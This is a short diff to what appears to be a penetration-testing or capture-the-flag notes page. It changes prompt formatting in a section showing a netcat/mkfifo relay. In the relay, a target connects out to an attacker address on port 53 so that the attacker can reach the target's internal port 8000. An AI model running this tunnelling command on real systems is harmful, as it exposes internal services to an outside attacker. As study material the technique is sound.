@@ -148,12 +148,12 @@ $ curl -i \
 9. Ncat the hard way
 
 ````bash
-attacker1> # mkfifo backpipe; nc -lvp 8000 < backpipe | nc -lnvp 53 > backpipe; rm backpipe
+attacker1 #>  mkfifo backpipe; nc -lvp 8000 < backpipe | nc -lnvp 53 > backpipe; rm backpipe
 listening on [any] 8000 ...listening on [any] 53 ...
 
-target> $ mkfifo backpipe; nc 10.10.14.221 53 < backpipe | nc 127.0.0.1 8000 > backpipe; rm backpipe
+target $>  mkfifo backpipe; nc 10.10.14.221 53 < backpipe | nc 127.0.0.1 8000 > backpipe; rm backpipe
 
-attacker2> # curl http://127.0.0.1:8000
+attacker2 #> curl http://127.0.0.1:8000
 <!DOCTYPE html>
 <html lang="en">
     <head>
